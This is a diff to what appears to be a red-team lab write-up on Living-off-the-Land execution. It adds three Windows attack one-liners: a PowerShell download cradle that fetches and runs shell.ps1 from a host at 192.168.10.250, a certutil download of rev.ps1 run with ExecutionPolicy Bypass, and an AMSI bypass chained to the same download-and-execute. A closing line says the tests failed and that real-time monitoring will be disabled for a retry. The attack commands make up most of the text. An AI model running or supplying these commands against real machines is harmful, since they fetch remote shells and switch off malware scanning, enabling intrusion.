@@ -22,5 +22,17 @@ The goal is to simulate real-world adversary behavior using **Living-off-the-Lan
 ### Execution Methods Tested
 
 ### Method 1: PowerShell Download Cradle (Basic)
-```powershell
+powershell
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.10.250/shell.ps1')"
+
+Method 2: Certutil + PowerShell
+CMD
+certutil -urlcache -split -f http://192.168.10.250/shell.ps1 C:\Temp\rev.ps1
+powershell -ExecutionPolicy Bypass -File C:\Temp\rev.ps1
+
+Method 3: AMSI Bypass One-Liner
+powershell 
+powershell -nop -w hidden -ExecutionPolicy Bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX((New-Object Net.WebClient).DownloadString('http://192.168.10.250/shell.ps1'))"
+
+
+all test failed- will do Disabled real-time monitoring to the next attack and redo this attack. 
